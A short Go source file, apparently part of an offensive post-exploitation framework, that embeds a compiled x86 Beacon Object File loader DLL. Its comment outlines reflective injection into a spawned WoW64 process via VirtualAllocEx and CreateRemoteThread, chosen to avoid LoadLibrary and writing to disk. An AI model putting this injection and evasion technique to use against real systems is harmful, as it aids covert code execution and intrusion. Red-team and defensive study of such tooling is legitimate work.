//go:build windows && bof_x86_loader

package bof

import _ "embed"

//go:embed internal/x86loader/bof_x86_loader.x86.dll
var x86LoaderDLL []byte

// loadX86LoaderShellcode returns the embedded x86 BOF loader DLL.
// Linked into the binary by the `bof_x86_loader` build tag. The
// orchestrator (x86fork_windows.go) manually reflective-loads the
// DLL into a freshly-spawned WoW64 host: parses the PE header,
// VirtualAllocEx's the image, copies each section, applies the
// .reloc table against the new base address, then
// CreateRemoteThread targets the BOFExec export. No
// LoadLibrary, no disk drop.
//
// The artefact is produced by scripts/build-bof-x86-loader.sh;
// the committed .dll is the source of truth so `go build` works
// without any C toolchain (same pattern as
// runtime/pe/internal/noconsolation/NoConsolation.x64.o). The
// "Shellcode" suffix in the function name is a historical
// remainder — the bytes are PE32, not flat shellcode.
func loadX86LoaderShellcode() ([]byte, error) {
	return x86LoaderDLL, nil
}
